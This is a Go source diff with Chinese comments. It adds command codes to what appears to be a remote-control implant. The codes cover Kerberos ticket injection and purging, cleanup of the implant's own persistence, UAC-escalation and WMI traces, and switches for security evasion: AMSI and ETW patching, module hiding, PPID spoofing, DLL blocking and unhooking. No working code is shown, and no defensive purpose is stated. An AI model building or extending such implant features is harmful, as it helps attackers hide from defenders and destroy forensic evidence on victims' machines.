@@ -151,4 +151,16 @@ const (
 	// cmdBuf = "list" | "purge [服务名]" | "ptt <base64 的 kirbi>"。
 	// 采集走制品管线（kind=ticket），动作走命令回显。
 	KERB_ACTION = 133
+
+	// 清理现场（P1，须与服务端 pkg/command/cmdType.go 一致）：
+	// cmdBuf = "all|persist|files|uac|wmi"（可空格分隔，空串等价 all）。
+	// 只清本程序自己留下的持久化项/更新残留/提权与 WMI 副产物，逐条回执。
+	CLEANUP = 134
+
+	// 对抗能力开关（P4，须与服务端 pkg/command/cmdType.go 一致）：
+	// cmdBuf = "" | "status" | "on <能力>" | "off <能力>" | "reset" | "all on|off"。
+	// 能力名：etw / amsi / modhide / spoof / ppid / blockdlls / unhook。
+	// 覆盖只在内存里，不跨重连；启动期能力（etw/amsi/unhook）运行期开=立即执行一次，
+	// 关掉不会撤销已打的补丁。
+	EVASION = 135
 )
